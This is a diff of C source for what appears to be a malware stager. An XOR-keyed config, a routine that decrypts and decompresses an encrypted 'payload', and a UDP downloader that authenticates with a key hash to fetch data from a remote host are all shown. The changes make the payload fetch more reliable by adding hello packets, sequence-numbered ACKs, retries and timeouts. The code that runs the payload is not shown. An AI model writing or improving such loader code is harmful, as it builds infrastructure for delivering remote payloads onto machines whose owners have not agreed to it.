@@ -38,7 +38,7 @@
 #define CONFIG_XOR_KEY 0x5A
 #endif
 
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 65536
 
 #ifdef DEBUG
 #define DEBUG_PRINT(fmt, args...) fprintf(stderr, "DEBUG: " fmt, ##args)
@@ -110,21 +110,28 @@ static int build_payload_from_encrypted(const char *enc_buf, size_t enc_size,
   memcpy(cipher, enc_buf + 16, encrypted_body);
   decrypt_data(cipher, encrypted_body, key, iv);
 
-  unsigned int decomp_size = (unsigned int)encrypted_body * 10;
+  unsigned int capacity = (unsigned int)encrypted_body * 10;
   char *decomp = NULL;
   int res = TINF_OK;
+  unsigned int out_len = 0;
+
   for (int attempt = 0; attempt < 3; attempt++) {
-    decomp = calloc(decomp_size, sizeof(char));
+    decomp = calloc(capacity, sizeof(char));
     if (!decomp) {
       free(cipher);
       return -1;
     }
-    res = tinf_uncompress(decomp, &decomp_size, cipher, encrypted_body);
+
+    out_len = capacity;
+    res = tinf_uncompress(decomp, &out_len, cipher, encrypted_body);
     if (res == TINF_OK)
       break;
+
+    DEBUG_PRINT("Decompression attempt %d failed with error %d, capacity %u\n",
+                attempt, res, capacity);
     free(decomp);
     decomp = NULL;
-    decomp_size *= 2; // try a larger buffer
+    capacity *= 2; // try a larger buffer
   }
 
   free(cipher);
@@ -132,7 +139,7 @@ static int build_payload_from_encrypted(const char *enc_buf, size_t enc_size,
     return -1;
 
   *out_buf = decomp;
-  *out_size = decomp_size;
+  *out_size = out_len;
   return 0;
 }
 
@@ -279,35 +286,91 @@ size_t download_file(const char *host, const char *port, const char *path,
   struct sockaddr_storage src_addr;
   socklen_t src_len = sizeof(src_addr);
 
-  // Send key hash as authentication request
+  // Set timeout for recvfrom
+  struct timeval tv;
+  tv.tv_sec = 1;
+  tv.tv_usec = 0;
+  setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof tv);
+
+  // Send key hash as authentication request (Hello Packet)
   uint32_t key_hash = 0;
   for (int i = 0; i < 16; i++) {
     key_hash ^= ((uint32_t)key[i]) << ((i % 4) * 8);
   }
 
-  if (sendto(sockfd, &key_hash, sizeof(key_hash), 0, saved_res->ai_addr,
-             saved_res->ai_addrlen) == -1) {
-    DEBUG_PERROR("sendto");
-    close(sockfd);
-    freeaddrinfo(saved_res);
-    return 0;
-  }
+  char hello_packet[5];
+  hello_packet[0] = 0x02;
+  memcpy(hello_packet + 1, &key_hash, 4);
+
+  uint32_t expected_seq = 0;
+  int hello_retries = 0;
 
   // Receive data in chunks
   while (1) {
+    // Send Hello if we haven't received any data yet
+    if (expected_seq == 0) {
+      if (sendto(sockfd, hello_packet, 5, 0, saved_res->ai_addr,
+                 saved_res->ai_addrlen) == -1) {
+        DEBUG_PERROR("sendto");
+        close(sockfd);
+        freeaddrinfo(saved_res);
+        return 0;
+      }
+    }
+
     ssize_t bytes_received =
         recvfrom(sockfd, temp_buffer, sizeof(temp_buffer), 0,
                  (struct sockaddr *)&src_addr, &src_len);
+
     if (bytes_received <= 0) {
-      break;
+      // Timeout or error
+      if (expected_seq == 0) {
+        hello_retries++;
+        if (hello_retries > 20) {
+          DEBUG_PRINT("Timeout waiting for server response\n");
+          break;
+        }
+        continue; // Retry Hello
+      } else {
+        // Wait for server retransmission
+        continue;
+      }
     }
-    // Check for end marker (4 zero bytes)
-    if (bytes_received == 4 && *(uint32_t *)temp_buffer == 0) {
-      break;
+
+    if (bytes_received < 5)
+      continue;
+
+    uint8_t type = temp_buffer[0];
+    if (type != 0x00)
+      continue; // Only expect Data packets
+
+    uint32_t seq = *(uint32_t *)(temp_buffer + 1);
+    size_t payload_len = bytes_received - 5;
+
+    if (seq == expected_seq) {
+      // Send ACK
+      char ack_packet[5];
+      ack_packet[0] = 0x01;
+      memcpy(ack_packet + 1, &seq, 4);
+      sendto(sockfd, ack_packet, 5, 0, (struct sockaddr *)&src_addr, src_len);
+
+      // End marker: empty payload
+      if (payload_len == 0) {
+        break;
+      }
+
+      *buffer = realloc(*buffer, data_size + payload_len);
+      memcpy(*buffer + data_size, temp_buffer + 5, payload_len);
+      data_size += payload_len;
+
+      expected_seq++;
+    } else if (seq < expected_seq) {
+      // Retransmit ACK for old packet
+      char ack_packet[5];
+      ack_packet[0] = 0x01;
+      memcpy(ack_packet + 1, &seq, 4);
+      sendto(sockfd, ack_packet, 5, 0, (struct sockaddr *)&src_addr, src_len);
     }
-    *buffer = realloc(*buffer, data_size + bytes_received);
-    memcpy(*buffer + data_size, temp_buffer, bytes_received);
-    data_size += bytes_received;
   }
 
   freeaddrinfo(saved_res);
